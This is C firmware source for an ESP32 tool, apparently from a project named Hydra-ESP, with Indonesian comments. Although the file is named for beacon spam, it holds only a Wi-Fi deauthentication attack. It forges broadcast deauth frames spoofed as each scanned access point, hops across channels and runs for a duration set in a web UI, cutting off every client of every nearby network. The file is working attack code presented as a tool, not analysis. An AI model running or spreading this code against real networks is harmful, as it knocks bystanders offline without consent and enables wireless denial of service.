/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * 
 * @brief REVISI TOTAL: 100% KHUSUS DEAUTH HOPPING.
 *        - Seluruh kode Beacon Spam dihapus total.
 *        - Fokus penuh pada pemutusan koneksi (Deauth) multi-channel.
 *        - Fitur Thermal Safe Mode terintegrasi agar chip tidak kepanasan.
 *        - Sinkron penuh dengan durasi menit dari Web UI 192.168.4.1 (count).
 */

#include "attack_beacon_spam.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

// Menghubungkan ke modul scanner internal proyek Hydra-ESP
#include "ap_scanner.h"

static const char *TAG = "hydra_pure_deauth";
static esp_timer_handle_t attack_timer_handle = NULL;
static bool is_attack_running = false;

#define MAX_DEAUTH_TARGETS 100

typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
} deauth_target_t;

static deauth_target_t target_pool[MAX_DEAUTH_TARGETS];
static uint16_t total_targets = 0;
static uint16_t current_target_index = 0;

// Penghitung biner ticks (1 tick = 100ms)
static uint32_t attack_execution_counter = 0;
static uint32_t total_max_ticks = 3000;   

/**
 * @brief Fungsi injeksi raw packet Deauth Frame tingkat rendah
 */
static void send_raw_deauth_frame(const uint8_t *target_bssid, uint8_t channel) {
    uint8_t deauth_packet[26];
    memset(deauth_packet, 0, sizeof(deauth_packet));
    
    deauth_packet[0] = 0xC0; deauth_packet[1] = 0x00; // Type/Subtype: Deauthentication
    
    // Alamat Tujuan: Broadcast (Memutuskan SEMUA klien yang terhubung ke AP tersebut)
    memset(&deauth_packet[4], 0xFF, 6); 
    
    // Alamat Sumber & BSSID (Menyamar menjadi AP asli agar dipercaya klien)
    memcpy(&deauth_packet[10], target_bssid, 6); 
    memcpy(&deauth_packet[16], target_bssid, 6); 
    
    deauth_packet[24] = 0x07; // Reason Code: Class 3 frame received from nonassociated STA

    // Pindah channel fisik radio ESP32 secara instan
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Pancarkan paket mentah ke udara
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, 26, false);
}

/**
 * @brief Loop internal berbasis Timer FreeRTOS (Anti-Freeze Web UI & Anti-Panas)
 */
static void attack_timer_callback(void *arg) {
    if (!is_attack_running || total_targets == 0) return;
    attack_execution_counter++;

    // 1. Pengaman Timeout Total berdasarkan durasi menit pilihan di Web UI
    if (attack_execution_counter >= total_max_ticks) {
        ESP_LOGW(TAG, "Durasi serangan dari Web UI selesai. Menghentikan Deauth Hopping.");
        attack_beacon_spam_stop();
        return;
    }

    // 2. THERMAL SAFE MODE (Sistem Pencegah Panas Berlebih)
    // Setiap kelipatan 10 ticks (1 detik operasi), ESP32 akan beristirahat selama 1 tick (100ms)
    // tanpa memancarkan sinyal. Jeda mikro ini meredam akumulasi panas ekstrem pada chip radio.
    if (attack_execution_counter % 10 == 0) {
        return; 
    }

    // 3. Eksekusi Deauth Hopping Maksimal
    deauth_target_t *target = &target_pool[current_target_index];
    
    // Kirim paket deauth ke target saat ini
    send_raw_deauth_frame(target->bssid, target->channel);
    
    // Lompat ke target/channel berikutnya pada loop tick selanjutnya (100ms per lompatan)
    current_target_index = (current_target_index + 1) % total_targets;
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    if (is_attack_running) {
        attack_beacon_spam_stop();
    }

    uint16_t scanned_count = ap_scanner_get_count();
    attack_execution_counter = 0;
    current_target_index = 0;

    // SINKRONISASI WAKTU: Mengonversi menit dari Web UI ke Ticks (1 menit = 600 Ticks)
    uint32_t input_seconds = (count > 0) ? (count * 60) : 300; 
    total_max_ticks = (input_seconds * 10); 

    memset(target_pool, 0, sizeof(target_pool));

    // Mengambil data target dari hasil scan di Web UI
    total_targets = (scanned_count > MAX_DEAUTH_TARGETS) ? MAX_DEAUTH_TARGETS : scanned_count;
    ESP_LOGI(TAG, "Memulai PURE DEAUTH HOPPING (%d Target, Durasi UI: %d Menit)", total_targets, count);

    if (total_targets == 0) {
        // Fallback otomatis jika pengguna belum menekan tombol 'Scan AP' di Web UI
        // Membuat target tiruan di channel utama (1, 6, 11) agar program tidak crash
        total_targets = 3;
        uint8_t channels[] = {1, 6, 11};
        for (int i = 0; i < total_targets; i++) {
            target_pool[i].channel = channels[i];
            for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
        }
    } else {
        // Memasukkan semua BSSID & Channel AP nyata hasil scan Web UI ke dalam antrean deauth
        for (int i = 0; i < total_targets; i++) {
            const wifi_ap_record_t *record = ap_scanner_get_record(i);
            if (record != NULL) {
                memcpy(target_pool[i].bssid, record->bssid, 6);
                target_pool[i].channel = record->primary;
            }
        }
    }

    // Menjalankan Timer secara Asinkronus (Bebas dari Lockup/Freeze pada Web UI)
    is_attack_running = true;
    esp_timer_create_args_t timer_args = {
        .callback = &attack_timer_callback,
        .name = "deauth_hop_timer",
        .arg = NULL,
        .dispatch_method = ESP_TIMER_TASK
    };
    
    esp_timer_create(&timer_args, &attack_timer_handle);
    esp_timer_start_periodic(attack_timer_handle, 100000); // 100ms per Tick Lompatan Channel
}

void attack_beacon_spam_stop(void) {
    if (!is_attack_running) return;

    is_attack_running = false;
    if (attack_timer_handle != NULL) {
        esp_timer_stop(attack_timer_handle);
        esp_timer_delete(attack_timer_handle);
        attack_timer_handle = NULL;
    }
    
    ESP_LOGI(TAG, "Serangan Pure Deauth Hopping dihentikan. Radio kembali normal.");
}
